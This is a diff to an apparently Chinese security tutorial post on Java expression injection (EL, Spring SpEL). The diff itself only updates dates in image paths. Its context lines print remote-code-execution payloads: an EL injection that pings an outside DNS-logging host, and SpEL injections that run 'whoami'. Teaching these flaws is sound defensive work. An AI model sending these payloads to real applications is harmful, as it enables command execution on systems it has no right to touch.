@@ -158,7 +158,7 @@ public class JspJstlEl {
 ```
 
 ### 0x04.3.4 漏洞测试
-![pasted image 20260618084546](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084546.png)
+![pasted image 20260618084546](/assets/img/posts/2026-04-05-expression-injection-spel-ognl/pasted-image-20260618084546.png)
 
 
 ```
@@ -173,7 +173,7 @@ Content-Length: 203
 data=${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"ping -c 1 123.y4hmn1.dnslog.cn")}
 ```
 
-![pasted image 20260618084601](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084601.png)
+![pasted image 20260618084601](/assets/img/posts/2026-04-05-expression-injection-spel-ognl/pasted-image-20260618084601.png)
 
 
 
@@ -186,9 +186,9 @@ Connection: close
 
 ```
 
-![pasted image 20260618084607](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084607.png)
+![pasted image 20260618084607](/assets/img/posts/2026-04-05-expression-injection-spel-ognl/pasted-image-20260618084607.png)
 
-![pasted image 20260618084611](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084611.png)
+![pasted image 20260618084611](/assets/img/posts/2026-04-05-expression-injection-spel-ognl/pasted-image-20260618084611.png)
 
 ## 0x04.4 Spring SpEL
 ### 0x04.4.1 基础操作入门
@@ -280,7 +280,7 @@ Content-Length: 41
 s=new String('hello world').toUpperCase()
 ```
 
-![pasted image 20260618084625](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084625.png)
+![pasted image 20260618084625](/assets/img/posts/2026-04-05-expression-injection-spel-ognl/pasted-image-20260618084625.png)
 
 
 
@@ -295,7 +295,7 @@ Content-Length: 97
 s=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()
 ```
 
-![pasted image 20260618084631](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084631.png)
+![pasted image 20260618084631](/assets/img/posts/2026-04-05-expression-injection-spel-ognl/pasted-image-20260618084631.png)
 
 #### 0x04.4.4.2 test2路由
 
@@ -310,7 +310,7 @@ Content-Length: 19
 s=aaaa#{12*12}fffff
 ```
 
-![pasted image 20260618084636](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084636.png)
+![pasted image 20260618084636](/assets/img/posts/2026-04-05-expression-injection-spel-ognl/pasted-image-20260618084636.png)
 
 ```
 // test2路由,漏洞测试数据包,命令执行测试
@@ -323,7 +323,7 @@ Content-Length: 100
 s=#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}
 ```
 
-![pasted image 20260618084642](/assets/img/posts/2026-10-05-expression-injection-spel-ognl/pasted-image-20260618084642.png)
+![pasted image 20260618084642](/assets/img/posts/2026-04-05-expression-injection-spel-ognl/pasted-image-20260618084642.png)
 
 ## 0x05 特别致谢
 ## 0x05.1 前言
